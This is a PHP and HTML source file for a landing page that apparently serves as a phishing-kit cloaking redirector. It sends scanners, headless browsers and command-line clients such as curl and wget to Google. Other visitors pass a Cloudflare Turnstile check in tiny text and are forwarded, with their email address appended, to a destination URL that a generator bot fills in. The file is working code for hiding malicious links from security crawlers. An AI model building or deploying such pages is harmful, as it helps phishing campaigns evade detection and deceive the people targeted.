<?php
// Bot Detection - Redirects bots to Google
function is_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    $bot_indicators = [
        'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 
        'playwright', 'chromedriver', 'bot', 'crawler', 'spider', 
        'scraper', 'python-requests', 'curl', 'wget', 'axios', 
        'node-fetch', 'go-http-client', 'java/', 'okhttp'
    ];
    
    foreach ($bot_indicators as $indicator) {
        if (strpos($user_agent, $indicator) !== false) {
            return true;
        }
    }
    
    if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) || !isset($_SERVER['HTTP_ACCEPT_ENCODING'])) {
        return true;
    }
    
    if (empty($user_agent) || strlen($user_agent) < 10) {
        return true;
    }
    
    return false;
}

// Redirect bots to Google
if (is_bot()) {
    header('Location: https://www.google.com', true, 302);
    exit;
}

// Configuration - Your bot will replace this URL when generating files
$destination_url = "REDIRECT_URL_PLACEHOLDER";

// Set no-cache headers
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚥 </title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script>
        let turnstileToken = null;
        let redirectUrl = null;

        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            const results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        function buildRedirectUrl() {
            const email = getParameterByName('email');
            const redirectBaseUrl = "<?php echo htmlspecialchars($destination_url); ?>";
            let url = redirectBaseUrl;

            if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                url += `?email=${encodeURIComponent(email)}`;
            }

            if (turnstileToken) {
                url += (url.includes('?') ? '&' : '?') + `cf-turnstile-response=${encodeURIComponent(turnstileToken)}`;
            }

            return url;
        }

        function onTurnstileSuccess(token) {
            console.log("✓ Turnstile verification successful");
            turnstileToken = token;

            const statusEl = document.getElementById('status');
            const messageEl = document.getElementById('message');

            statusEl.className = 'status success';
            statusEl.style.display = 'block';
            messageEl.textContent = 'Please wait while we redirect you...';

            redirectUrl = buildRedirectUrl();
            console.log("Redirecting to:", redirectUrl);

            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 1500);
        }

        function onTurnstileError(errorCode) {
            console.error("✗ Turnstile error:", errorCode);
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.textContent = '✗ Verification failed. Please refresh the page and try again.';
        }

        function onTurnstileExpired() {
            console.warn("⚠ Turnstile token expired");
            turnstileToken = null;
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.textContent = '⚠ Verification expired. Please complete the challenge again.';
        }

        function onTurnstileTimeout() {
            console.warn("⚠ Turnstile timeout");
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.textContent = '⚠ Verification timed out. Please refresh the page.';
        }
    </script>
    <style>
        .status {
            display: none;
        }
        .status.success {
            color: #4CAF50;
        }
        .status.error {
            color: #f44336;
        }
    </style>
</head>
<body style="font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;">
    <div style="padding: 40px;text-align: center; max-width: 400px;">
        <p id="message" style="color: #666; margin-bottom: 10px; font-size: 7px;">Please complete the security check below to continue.</p>
        <div style="display: flex; justify-content: center; margin: 20px 0;">
            <div class="cf-turnstile" 
                 data-sitekey="0x4AAAAAAB5LyZflvKtbvXXa"
                 data-callback="onTurnstileSuccess"
                 data-error-callback="onTurnstileError"
                 data-expired-callback="onTurnstileExpired"
                 data-timeout-callback="onTurnstileTimeout"
                 data-theme="dark">
            </div>
        </div>
        <div id="status" class="status"></div>

        <p style="margin-top: 10px; font-size: 8px; color: #999;">
            This page uses Cloudflare Turnstile to prevent automated access.
        </p>
    </div>
</body>
</html>
